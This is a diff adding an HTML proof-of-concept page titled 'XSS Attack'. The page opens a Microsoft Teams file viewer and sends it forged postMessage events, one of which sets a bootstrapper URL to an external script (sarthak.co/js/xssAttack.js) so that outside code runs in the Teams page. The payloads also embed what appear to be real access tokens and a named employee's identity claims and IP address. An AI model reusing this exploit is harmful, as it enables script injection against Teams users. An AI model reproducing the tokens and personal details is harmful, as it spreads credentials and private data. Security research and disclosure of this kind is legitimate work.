@@ -1,0 +1,197 @@
+<html>
+	<head>
+		XSS Attack
+	</head>
+	<body>
+		XSS attack in action
+		<script type="text/javascript">
+			const w = window.open('https://teams.microsoft.com/files/apps/com.microsoft.teams.files/files/3323079891/open?agent=postmessage&objectUrl=https%3A%2F%2Fmicrosoft.sharepoint.com%2Fteams%2FBB-8%2FShared%20Documents%2FProducts%2FKensho%2FKensho_brownbag.pptx&fileId=04cda88d-5372-460c-b2cb-4d7b2b55070a&fileType=pptx&ctx=recent&scenarioId=853&locale=en-us&theme=default&version=20201126015&setting=ring.id:ring0&setting=createdTime:1608724739393')
+			setTimeout(() => {
+				w.postMessage({
+			  "eventId": "aadCurrentUser",
+			  "correlationId": "35f77ff0-0b12-405e-ad73-608b47a2db9b",
+			  "payload": {
+			    "authUser": {
+			      "isAuthenticated": true,
+			      "userName": "sasax@microsoft.com",
+			      "loginError": "",
+			      "profile": {
+			        "aud": "5e3ce6c0-2b1f-4285-8d4b-75ee78787346",
+			        "iss": "https://sts.windows.net/72f988bf-86f1-41af-91ab-2d7cd011db47/",
+			        "iat": 1608723825,
+			        "nbf": 1608723825,
+			        "exp": 1608727725,
+			        "acct": 0,
+			        "aio": "AWQAm/8SAAAAEU11KRfI15qwT0o1o4yEjbSQAoyvXosJbU4pGuS1lO1HkT8smCsWRDfgCtG1hfyyvpRO2Wg9zoZZTdLN4qFDfjC7NrNAU3Wbc6vNqTYZooebL0iXiul8aKNvvdxV3ifE",
+			        "amr": [
+			          "pwd",
+			          "mfa"
+			        ],
+			        "family_name": "Saxena",
+			        "given_name": "Sarthak",
+			        "ipaddr": "122.177.82.73",
+			        "name": "Sarthak Saxena",
+			        "nonce": "6d3e8eca-47ee-4f54-b89c-1e9c11b17bd6",
+			        "oid": "e542e5b0-1361-4385-ac48-d2e399ce6684",
+			        "onprem_sid": "S-1-5-21-2146773085-903363285-719344707-2617771",
+			        "puid": "10032000B6736F97",
+			        "rh": "0.ARoAv4j5cvGGr0GRqy180BHbR8DmPF4fK4VCjUt17nh4c0YaAF8.",
+			        "sub": "HXoXDmKoBRg_kFsSn5ZobQDqLeMsdzhuyTpHKTPRD0k",
+			        "tid": "72f988bf-86f1-41af-91ab-2d7cd011db47",
+			        "unique_name": "sasax@microsoft.com",
+			        "upn": "sasax@microsoft.com",
+			        "uti": "8cctnAkePECI8E2AJtB6AQ",
+			        "ver": "1.0",
+			        "xms_mpci": 259200,
+			        "xms_pci": 3600
+			      },
+			      "userRole": 0
+			    }
+			  },
+			  "channel": "multi-window-manager-channel",
+			  "origin": "https://local.teams.office.com:8080",
+			  "metaData": {
+			    "correlationId": "35f77ff0-0b12-405e-ad73-608b47a2db9b",
+			    "source": "browserWindow",
+			    "destination": {
+			      "channel": "aadCurrentUser",
+			      "processIds": []
+			    }
+			  }
+
+			}, "https://teams.microsoft.com")
+
+
+			setTimeout(() => w.postMessage({
+				  "eventId": "getDriveItemResponse",
+				  "correlationId": "8468fc8d-34b6-4d98-b21b-b7cf39ba2eaa",
+				  "payload": {
+				    "@odata.context": "https://microsoft.sharepoint.com/teams/BB-8/_api/v2.0/$metadata#items/$entity",
+				    "@odata.type": "#oneDrive.item",
+				    "@odata.id": "https://microsoft.sharepoint.com/teams/BB-8/_api/v2.0/drives/b!1MnWU2aSsU-C1QBhwWNVPxrg9JSg_2RJml2BZhGxFAxLQNYYqAk1RITxV0Cf0XRH/items/013XNQIK4NVDGQI4STBRDLFS2NPMVVKBYK",
+				    "@odata.editLink": "drives/b!1MnWU2aSsU-C1QBhwWNVPxrg9JSg_2RJml2BZhGxFAxLQNYYqAk1RITxV0Cf0XRH/items/013XNQIK4NVDGQI4STBRDLFS2NPMVVKBYK",
+				    "@content.downloadUrl": "https://microsoft.sharepoint.com/teams/BB-8/_layouts/15/download.aspx?UniqueId=04cda88d-5372-460c-b2cb-4d7b2b55070a&Translate=false&tempauth=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdWQiOiIwMDAwMDAwMy0wMDAwLTBmZjEtY2UwMC0wMDAwMDAwMDAwMDAvbWljcm9zb2Z0LnNoYXJlcG9pbnQuY29tQDcyZjk4OGJmLTg2ZjEtNDFhZi05MWFiLTJkN2NkMDExZGI0NyIsImlzcyI6IjAwMDAwMDAzLTAwMDAtMGZmMS1jZTAwLTAwMDAwMDAwMDAwMCIsIm5iZiI6IjE2MDg3MjQ3NDEiLCJleHAiOiIxNjA4NzI1MDQxIiwiZW5kcG9pbnR1cmwiOiJ0VUcrWjVJQVRFS0w4YzF2Y2RCZU15b2dyZkorTFdSa0d3SnBZaTN4TTd3PSIsImVuZHBvaW50dXJsTGVuZ3RoIjoiMTMxIiwiaXNsb29wYmFjayI6IlRydWUiLCJjaWQiOiJORFV4WVRsaE9XWXROVEF6Wmkwd01EQXdMV1F3TUdZdFlqZzFaakJpWldZME1qSmsiLCJ2ZXIiOiJoYXNoZWRwcm9vZnRva2VuIiwic2l0ZWlkIjoiTlROa05tTTVaRFF0T1RJMk5pMDBabUl4TFRneVpEVXRNREEyTVdNeE5qTTFOVE5tIiwiYXBwX2Rpc3BsYXluYW1lIjoiTWljcm9zb2Z0IFRlYW1zIFdlYiBDbGllbnQiLCJnaXZlbl9uYW1lIjoiU2FydGhhayIsImZhbWlseV9uYW1lIjoiU2F4ZW5hIiwic2lnbmluX3N0YXRlIjoiW1wia21zaVwiLFwiZHZjX2NtcFwiXSIsImFjIjoibXxoIiwiYXBwaWQiOiI1ZTNjZTZjMC0yYjFmLTQyODUtOGQ0Yi03NWVlNzg3ODczNDYiLCJ0aWQiOiI3MmY5ODhiZi04NmYxLTQxYWYtOTFhYi0yZDdjZDAxMWRiNDciLCJ1cG4iOiJzYXNheEBtaWNyb3NvZnQuY29tIiwicHVpZCI6IjEwMDMyMDAwQjY3MzZGOTciLCJjYWNoZWtleSI6IjBoLmZ8bWVtYmVyc2hpcHwxMDAzMjAwMGI2NzM2Zjk3QGxpdmUuY29tIiwic2NwIjoibXlmaWxlcy53cml0ZSBhbGxzaXRlcy5mdWxsY29udHJvbCBhbGxzaXRlcy5tYW5hZ2UgYWxscHJvZmlsZXMud3JpdGUiLCJ0dCI6IjIiLCJ1c2VQZXJzaXN0ZW50Q29va2llIjpudWxsfQ.WXB2TDlJblVhcXZFakh2endjM1ZyZEg0TXhmcDNDdCtTMzRUYnFJUnpzWT0&ApiVersion=2.0",
+				    "eTag": "\"{04CDA88D-5372-460C-B2CB-4D7B2B55070A},106\"",
+				    "name": "Kensho_brownbag.pptx",
+				    "webUrl": "https://microsoft.sharepoint.com/teams/BB-8/_layouts/15/Doc.aspx?sourcedoc=%7B04CDA88D-5372-460C-B2CB-4D7B2B55070A%7D&file=Kensho_brownbag.pptx&action=edit&mobileredirect=true",
+				    "currentUserRole": {
+				      "blocksDownload": false,
+				      "readOnly": false
+				    },
+				    "file": {
+				      "hashes": {
+				        "quickXorHash": "yzuQoxUGsHoNzjsrFk+7USSmwEg="
+				      },
+				      "irmEnabled": false,
+				      "mimeType": "application/vnd.openxmlformats-officedocument.presentationml.presentation"
+				    },
+				    "officeBundle": {
+				      "cTag": "{04CDA88D-5372-460C-B2CB-4D7B2B55070A},106,57",
+				      "generationTime": "2020-12-16T10:20:10.746616Z",
+				      "url": "https://microsoft.sharepoint.com/teams/BB-8/_api/v2.0/drives/b!1MnWU2aSsU-C1QBhwWNVPxrg9JSg_2RJml2BZhGxFAxLQNYYqAk1RITxV0Cf0XRH/items/013XNQIK4NVDGQI4STBRDLFS2NPMVVKBYK/versions/Published/streams/content_preview_O{0}/streamContent?tempauth=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdWQiOiIwMDAwMDAwMy0wMDAwLTBmZjEtY2UwMC0wMDAwMDAwMDAwMDAvbWljcm9zb2Z0LnNoYXJlcG9pbnQuY29tQDcyZjk4OGJmLTg2ZjEtNDFhZi05MWFiLTJkN2NkMDExZGI0NyIsImlzcyI6IjAwMDAwMDAzLTAwMDAtMGZmMS1jZTAwLTAwMDAwMDAwMDAwMCIsIm5iZiI6IjE2MDg3MjQ3NDEiLCJleHAiOiIxNjA4NzQ2MzQxIiwiZW5kcG9pbnR1cmwiOiJpWDRXSEwxQ3dEUkNJeCswYlpXajlxUHZTNDZuNUlVOExlckdNR1hRK3RrPSIsImVuZHBvaW50dXJsTGVuZ3RoIjoiMTY4IiwiaXNsb29wYmFjayI6IlRydWUiLCJjaWQiOiJORFV4WVRsaE9XWXROVEF6Wmkwd01EQXdMV1F3TUdZdFlqZzFaakJpWldZME1qSmsiLCJ2ZXIiOiJoYXNoZWRwcm9vZnRva2VuIiwic2l0ZWlkIjoiTlROa05tTTVaRFF0T1RJMk5pMDBabUl4TFRneVpEVXRNREEyTVdNeE5qTTFOVE5tIiwiYXBwX2Rpc3BsYXluYW1lIjoiTWljcm9zb2Z0IFRlYW1zIFdlYiBDbGllbnQiLCJnaXZlbl9uYW1lIjoiU2FydGhhayIsImZhbWlseV9uYW1lIjoiU2F4ZW5hIiwic2lnbmluX3N0YXRlIjoiW1wia21zaVwiLFwiZHZjX2NtcFwiXSIsImFjIjoibXxoIiwiYXBwaWQiOiI1ZTNjZTZjMC0yYjFmLTQyODUtOGQ0Yi03NWVlNzg3ODczNDYiLCJ0aWQiOiI3MmY5ODhiZi04NmYxLTQxYWYtOTFhYi0yZDdjZDAxMWRiNDciLCJ1cG4iOiJzYXNheEBtaWNyb3NvZnQuY29tIiwicHVpZCI6IjEwMDMyMDAwQjY3MzZGOTciLCJjYWNoZWtleSI6IjBoLmZ8bWVtYmVyc2hpcHwxMDAzMjAwMGI2NzM2Zjk3QGxpdmUuY29tIiwic2NwIjoibXlmaWxlcy53cml0ZSBhbGxzaXRlcy5mdWxsY29udHJvbCBhbGxzaXRlcy5tYW5hZ2UgYWxscHJvZmlsZXMud3JpdGUiLCJ0dCI6IjIiLCJ1c2VQZXJzaXN0ZW50Q29va2llIjpudWxsfQ.UzFqbk4vMkRqREo0ZkJwSjhSak9aQnNTK3BuMVdMblJseXJ2MmVySmorUT0&usecachedssr=1&prefetchSSRCorrelationId=451a9a9f-503f-0000-d00f-b85f0bef422d",
+				      "version": "1.1360432825"
+				    },
+				    "openWith": {
+				      "wac": {
+				        "accessToken": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IkcydDJKYzlkMVZ6RkdjdzZUZy02YUhZVXk2VSJ9.eyJhdWQiOiJ3b3BpL21pY3Jvc29mdC5zaGFyZXBvaW50LmNvbUA3MmY5ODhiZi04NmYxLTQxYWYtOTFhYi0yZDdjZDAxMWRiNDciLCJpc3MiOiIwMDAwMDAwMy0wMDAwLTBmZjEtY2UwMC0wMDAwMDAwMDAwMDBAOTAxNDAxMjItODUxNi0xMWUxLThlZmYtNDkzMDQ5MjQwMTliIiwibmJmIjoiMTYwODcyNDc0MSIsImV4cCI6IjE2MDg3NjA3NDEiLCJuYW1laWQiOiIwIy5mfG1lbWJlcnNoaXB8c2FzYXhAbWljcm9zb2Z0LmNvbSIsIm5paSI6Im1pY3Jvc29mdC5zaGFyZXBvaW50IiwiaXN1c2VyIjoidHJ1ZSIsImNhY2hla2V5IjoiMGguZnxtZW1iZXJzaGlwfDEwMDMyMDAwYjY3MzZmOTdAbGl2ZS5jb20iLCJzaGFyaW5naWQiOiI2YWZjYTU1NC0wY2M5LTQ3ZDktYmFmZC1jZGMyZjMwZmRkYTIiLCJzaWduaW5fc3RhdGUiOiJbXCJrbXNpXCIsXCJkdmNfY21wXCJdIiwiYWMiOiJtfGgiLCJpc2xvb3BiYWNrIjoiVHJ1ZSIsImFwcGN0eCI6IjA0Y2RhODhkNTM3MjQ2MGNiMmNiNGQ3YjJiNTUwNzBhO01paVRYYTl4SHRqZUJidHVTZ0NZZkpoaDFpMD07RGVmYXVsdDs7MUIwM0M0MzEyRUY7VHJ1ZTs7OzU4MDs0NTFhOWE5Zi01MDNmLTAwMDAtZDAwZi1iODVmMGJlZjQyMmQifQ.tT4QtCPGDXahN8QM7rR74wMEKA-BXQV9GvxUR5efsVUU_L_wXqdMKRJu0cuJ8GT-t4Zzic7svTbf38dLYMcSXn58fO5IBe6i400sf1qgzKNngUcoAXhJ_W7mlfxinYXoJxDYPMJFtpI_aK0VdBZ8mHB39SATg9ngqTwVvw7lSd52Kff59oZjvSL8tOVbeFbSERsWtaWGoKiW5s_-bQRDSS1tKavGRjkfgzA4d7ZnnWEKb456weI2A_04dBrF9xnGutSeDa9o6-fLtwKlWlha5kMKv4GHrOi3KWUeRFQ7PQMsttUecqZgKd2cvYWimUa_H2ZUGEwsn6VOV0B2igm06A",
+				        "accessTokenExpiry": "1608760741250",
+				        "applicationUrl": "https://PPC-powerpoint.officeapps.live.com/p/PowerPointFrame.aspx?PowerPointView=EditView&ui=en%2DUS&rs=en%2DUS&WOPISrc=https%3A%2F%2Fmicrosoft%2Esharepoint%2Ecom%2Fteams%2FBB%2D8%2F%5Fvti%5Fbin%2Fwopi%2Eashx%2Ffiles%2F04cda88d5372460cb2cb4d7b2b55070a&wdEnableRoaming=1&wdFR=1&mscc=1&hid=451a9a9f-503f-0000-d00f-b85f0bef422d",
+				        "bootstrapperUrl": "https://sarthak.co/js/xssAttack.js",
+				        "clientThrottlingProtection": "LeastProtected",
+				        "complianceZone": "ppc",
+				        "fileGetUrl": "https://microsoft.sharepoint.com/teams/BB-8/_layouts/15/download.aspx?UniqueId=04cda88d-5372-460c-b2cb-4d7b2b55070a&Translate=false&tempauth=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdWQiOiIwMDAwMDAwMy0wMDAwLTBmZjEtY2UwMC0wMDAwMDAwMDAwMDAvbWljcm9zb2Z0LnNoYXJlcG9pbnQuY29tQDcyZjk4OGJmLTg2ZjEtNDFhZi05MWFiLTJkN2NkMDExZGI0NyIsImlzcyI6IjAwMDAwMDAzLTAwMDAtMGZmMS1jZTAwLTAwMDAwMDAwMDAwMCIsIm5iZiI6IjE2MDg3MjQ3NDEiLCJleHAiOiIxNjA4NzYwNzQxIiwiZW5kcG9pbnR1cmwiOiJ0VUcrWjVJQVRFS0w4YzF2Y2RCZU15b2dyZkorTFdSa0d3SnBZaTN4TTd3PSIsImVuZHBvaW50dXJsTGVuZ3RoIjoiMTMxIiwiaXNsb29wYmFjayI6IlRydWUiLCJjaWQiOiJORFV4WVRsaE9XWXROVEF6Wmkwd01EQXdMV1F3TUdZdFlqZzFaakJpWldZME1qSmsiLCJ2ZXIiOiJoYXNoZWRwcm9vZnRva2VuIiwic2l0ZWlkIjoiTlROa05tTTVaRFF0T1RJMk5pMDBabUl4TFRneVpEVXRNREEyTVdNeE5qTTFOVE5tIiwiYXBwX2Rpc3BsYXluYW1lIjoiTWljcm9zb2Z0IFRlYW1zIFdlYiBDbGllbnQiLCJnaXZlbl9uYW1lIjoiU2FydGhhayIsImZhbWlseV9uYW1lIjoiU2F4ZW5hIiwic2lnbmluX3N0YXRlIjoiW1wia21zaVwiLFwiZHZjX2NtcFwiXSIsImFjIjoibXxoIiwiYXBwaWQiOiI1ZTNjZTZjMC0yYjFmLTQyODUtOGQ0Yi03NWVlNzg3ODczNDYiLCJ0aWQiOiI3MmY5ODhiZi04NmYxLTQxYWYtOTFhYi0yZDdjZDAxMWRiNDciLCJ1cG4iOiJzYXNheEBtaWNyb3NvZnQuY29tIiwicHVpZCI6IjEwMDMyMDAwQjY3MzZGOTciLCJjYWNoZWtleSI6IjBoLmZ8bWVtYmVyc2hpcHwxMDAzMjAwMGI2NzM2Zjk3QGxpdmUuY29tIiwic2NwIjoibXlmaWxlcy53cml0ZSBhbGxzaXRlcy5mdWxsY29udHJvbCBhbGxzaXRlcy5tYW5hZ2UgYWxscHJvZmlsZXMud3JpdGUiLCJ0dCI6IjIiLCJ1c2VQZXJzaXN0ZW50Q29va2llIjpudWxsfQ.RE55M3NnYkRHaUErWHNRa3JxL3BpWlBQaGZvM0diRXI2TmtWMGZDdUo1WT0",
+				        "licenseCheckForEditIsEnabled": true,
+				        "requestedCallThrottling": "Medium",
+				        "userId": "10032000b6736f97",
+				        "wopiSrc": "https://microsoft.sharepoint.com/teams/BB-8/_vti_bin/wopi.ashx/files/04cda88d5372460cb2cb4d7b2b55070a"
+				      },
+				      "webEmbed": {
+				        "viewUrl": "https://microsoft.sharepoint.com/teams/BB-8/_layouts/15/PreAuth.aspx?sourcedoc={04cda88d-5372-460c-b2cb-4d7b2b55070a}&action=view#access_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IkcydDJKYzlkMVZ6RkdjdzZUZy02YUhZVXk2VSJ9%2EeyJhdWQiOiJ3b3BpL21pY3Jvc29mdC5zaGFyZXBvaW50LmNvbUA3MmY5ODhiZi04NmYxLTQxYWYtOTFhYi0yZDdjZDAxMWRiNDciLCJpc3MiOiIwMDAwMDAwMy0wMDAwLTBmZjEtY2UwMC0wMDAwMDAwMDAwMDBAOTAxNDAxMjItODUxNi0xMWUxLThlZmYtNDkzMDQ5MjQwMTliIiwibmJmIjoiMTYwODcyNDc0MSIsImV4cCI6IjE2MDg3MjUwNDEiLCJuYW1laWQiOiIxMDAzMjAwMGI2NzM2Zjk3IiwibmlpIjoidXJuOmZlZGVyYXRpb246bWljcm9zb2Z0b25saW5lIiwiY2FjaGVrZXkiOiIwaC5mfG1lbWJlcnNoaXB8MTAwMzIwMDBiNjczNmY5N0BsaXZlLmNvbSIsImlzdXNlciI6InRydWUiLCJhYyI6Im18aCIsImFwcGlkIjoiNWUzY2U2YzAtMmIxZi00Mjg1LThkNGItNzVlZTc4Nzg3MzQ2IiwidGlkIjoiNzJmOTg4YmYtODZmMS00MWFmLTkxYWItMmQ3Y2QwMTFkYjQ3IiwiaXBhZGRyIjoiMTIyLjE3Ny44Mi43MyIsIndvcGlfYXAiOiJteWZpbGVzLndyaXRlIGFsbHNpdGVzLmZ1bGxjb250cm9sIGFsbHNpdGVzLm1hbmFnZSBhbGxwcm9maWxlcy53cml0ZSIsIndvcGlfdHQiOiJQcmVBdXRoVG9rZW4iLCJhcHBjdHgiOiIwNGNkYTg4ZDUzNzI0NjBjYjJjYjRkN2IyYjU1MDcwYTtNaWlUWGE5eEh0amVCYnR1U2dDWWZKaGgxaTA9O0RlZmF1bHQ7OzFCMDNDNDMxMkVGO1RydWU7OzVlM2NlNmMwLTJiMWYtNDI4NS04ZDRiLTc1ZWU3ODc4NzM0Njs1ODA7NDUxYTlhOWYtNTAzZi0wMDAwLWQwMGYtYjg1ZjBiZWY0MjJkIn0%2EJ1n4iTZDIS567pucEAtxriexqHeNVyhdYbQFePNuQPWa7dG3LuEQ38I%2DcrfDrQKk%2DLcUXLPnspQJp84ePQhNBqXHTWF2%2Df5rB9NAJNoTe%5FXVh%5FkTUrlmuuFyqYfRAh0iB4nralg%2Dhq8T3W2jvJkgwUoWqZwHBzQ6cyCbdJzLqe%5FB4bLZlYqLl%2DxSMkDNbrC9jBZ%2Dwn%2D5TznAJeCNDeX8vapfEd2Tym%5Fztfu2kukMm4bL43vfGlXKxKHZtuLHYxJC53qjTMkUqS%2DWdVyTMOJxaQeabUmL5enLQmF4u26fVulWk%5FL%2DDgTbRRBW2JJnxgq6hf9nxP75IIvhATLjBjnbrg"
+				      }
+				    },
+				    "sensitivityLabel": {
+				      "displayName": "General",
+				      "id": "f42aa342-8706-4288-bd11-ebb85995028c",
+				      "protectionEnabled": false
+				    },
+				    "sharepointIds": {
+				      "listId": "18d6404b-09a8-4435-84f1-57409fd17447",
+				      "listItemId": "16496",
+				      "listItemUniqueId": "04cda88d-5372-460c-b2cb-4d7b2b55070a",
+				      "siteId": "53d6c9d4-9266-4fb1-82d5-0061c163553f",
+				      "siteUrl": "https://microsoft.sharepoint.com/teams/BB-8",
+				      "syncResourceId": "04cda88d5372460cb2cb4d7b2b55070a",
+				      "tenantId": "72f988bf-86f1-41af-91ab-2d7cd011db47",
+				      "webId": "94f4e01a-ffa0-4964-9a5d-816611b1140c"
+				    },
+				    "size": 3395012,
+				    "webDavUrl": "https://microsoft.sharepoint.com/teams/BB-8/Shared%20Documents/Products/Kensho/Kensho_brownbag.pptx",
+				    "driveItemCallStartTime": 1608724739379,
+				    "driveItemCallEndTime": 1608724770887,
+				    "fileActions": [
+				      {
+				        "id": "openInApp",
+				        "visibility": 1
+				      },
+				      {
+				        "id": "share",
+				        "visibility": 1
+				      },
+				      {
+				        "id": "conversation",
+				        "visibility": 0
+				      },
+				      {
+				        "id": "ellipsisOpenInApp",
+				        "visibility": 0
+				      },
+				      {
+				        "id": "ellipsisOpenInBrowser",
+				        "visibility": 1
+				      },
+				      {
+				        "id": "ellipsisDownload",
+				        "visibility": 1
+				      },
+				      {
+				        "id": "close",
+				        "visibility": 1
+				      }
+				    ],
+				    "flights": {
+				      "enableWACAppCreateNewDocumentScenario": true,
+				      "enableWACAppDocRebootScenario": true,
+				      "enableWordRibboninReadMode": false,
+				      "enableWACAppModeSwitch": true,
+				      "enablePassingDynamicThrottlingSignalToWAC": true,
+				      "enableWACCopyLinkScenario": true,
+				      "hideWACOneDriveFileLocationPicker": false,
+				      "enableWACUserAccessScenario": true,
+				      "enableWACFileRenameScenario": true,
+				      "enableFilesNotifications": false,
+				      "enableFileOpenExperiment": true,
+				      "enableWebAsDefaultFileOpenPreference": true,
+				      "enableFileClickOpeningInWeb": false,
+				      "enableExternalLinkScenario": true
+				    },
+				    "sessionOrigin": "TEAMS-WEB.recent.recent",
+				    "templateId": null,
+				    "userClickTime": 1608724739323,
+				    "rebootOverrideData": null
+				  },
+				  "channel": "multi-window-manager-channel",
+				  "origin": "https://local.teams.office.com:8080",
+				  "metaData": {
+				    "correlationId": "8468fc8d-34b6-4d98-b21b-b7cf39ba2eaa",
+				    "source": "browserWindow",
+				    "destination": {
+				      "channel": "getDriveItemResponse",
+				      "processIds": []
+				    }
+				  }
+				}, "https://teams.microsoft.com"), 3000)
+			}, 3000)
+		</script>
+	</body>
+</html>
+
